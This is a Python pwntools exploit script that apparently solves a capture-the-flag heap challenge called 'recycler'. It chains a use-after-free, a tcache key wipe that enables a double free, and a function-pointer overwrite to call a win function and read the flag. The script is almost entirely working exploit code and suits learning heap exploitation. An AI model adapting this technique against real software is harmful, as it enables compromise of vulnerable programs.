#!/usr/bin/env python3
from pwn import *

context.binary   = elf = ELF('./recycler', checksec=False)
context.log_level = 'INFO'

def conn():
    if args.REMOTE:
        return remote('offsec.m0lecon.it', 13587)
    return process(elf.path)

p = conn()

# ------------------------------------------------------------------
# Primitives — matched exactly to the source protocol
# ------------------------------------------------------------------

# case 1: menu > index > read(data, 24)   prompt: "data: "
def create(idx, data=b'A' * 24):
    p.sendlineafter(b'> ',      b'1')
    p.sendlineafter(b'index: ', str(idx).encode())
    p.sendafter(b'data: ',      data[:24].ljust(24, b'\x00'))

# case 2: menu > index   (no nulling of items[idx])
def free_item(idx):
    p.sendlineafter(b'> ',      b'2')
    p.sendlineafter(b'index: ', str(idx).encode())

# case 3: menu > index > read(items[idx], 32)   prompt: "payload: "
def edit(idx, data):
    p.sendlineafter(b'> ',      b'3')
    p.sendlineafter(b'index: ', str(idx).encode())
    p.sendafter(b'payload: ',   data[:32].ljust(32, b'\x00'))

# case 4: menu > index   calls items[idx]->action(items[idx])
def invoke(idx):
    p.sendlineafter(b'> ',      b'4')
    p.sendlineafter(b'index: ', str(idx).encode())

# ------------------------------------------------------------------
# Exploit
# ------------------------------------------------------------------

WIN = elf.sym.win

create(0)                                    # slot[0] -> chunk A

free_item(0)                                 # A -> tcache[0x20], key written at A[0x8]

# UAF write: zero fd (offset 0) and key (offset 8) before second free
# glibc will rewrite fd correctly during the second free regardless
edit(0, p64(0) + p64(0) + b'X' * 16)        # A[0x8] = 0  ->  key cleared

free_item(0)                                 # double free accepted; A twice in tcache

create(1)                                    # slot[1] -> A  (tcache pop #1)
create(2)                                    # slot[2] -> A  (tcache pop #2)

# Write win through the original dangling slot[0] pointer (never nulled)
edit(0, p64(WIN) + b'A' * 24)               # A->action = win

invoke(1)                                    # items[1]->action(items[1]) -> win() -> flag

print(p.recvall(timeout=2).decode(errors='replace'))